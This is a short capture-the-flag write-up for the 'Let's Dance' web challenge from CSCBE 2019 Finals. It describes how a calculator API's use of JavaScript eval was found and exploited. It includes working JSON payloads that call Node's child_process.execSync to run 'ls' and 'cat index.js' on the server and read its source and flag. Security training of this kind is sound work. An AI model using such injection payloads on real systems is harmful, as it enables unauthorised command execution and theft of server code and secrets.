# Let's Dance - Web (180 pts)

### [~$ cd ..](../)

Author: [renaud11232](https://renaud11232.github.io/ctf/CSCBE2019/Finals/lets_dance/)
>One of my friends created an online calculator yesterday! However he had some issues
with his API endpoint.. Could you take a look at this example request?
For this challenge, we were asked to find and exploit a vulnerability in a simple web API.

The API had only one route accepting only `POST` requests. The requests body were meant to be simple equations that were going to be solved. The requests and responses were `json` formatted.

The requests body looked like this:

```json
{
  "equation": "1+1"
}
```
And the responses:
```json
{
  "result": 2
}
```

We first tried some very crude buffer overflows and stack overflows by sending massive requests and equations with a lot of parenthesis. None of that worked.

Then we thought the backend may use a function like `eval(expr)` to compute the result, so we gave it a try. Sending :
```json
{
  "equation": "eval(1)"
}
```
gave us the following response :
```json
{
  "result": 1
}
```

Here we had found the vulnerability but not yet the language used, so we just sent another request :
```json
{
  "equation": "eval(1);"
}
```
This also gave us a successful response :
```json
{
  "result": 1
}
```
From here we thought about either a `php` or `js` server.
We placed our bet on `js` and tried the following request :
```json
{
  "equation": "var dummy = 1;"
}
```
This also gave us a successful response :
```json
{
  "result": 1
}
```
From here we started building a payload allowing us to execute commands on the server :

```json
{
    "equation": "const exec = require('child_process').execSync;var out = Buffer.from(exec('ls')).toString('hex');out;"

}
```

Which gave us `index.js` in hexadecimal. Then we made a last request :

```json
{
    "equation": "const exec = require('child_process').execSync;var out = Buffer.from(exec('cat index.js')).toString('hex');out;"
}
```

This gave us all the code of the server which contained the flag.

DONE
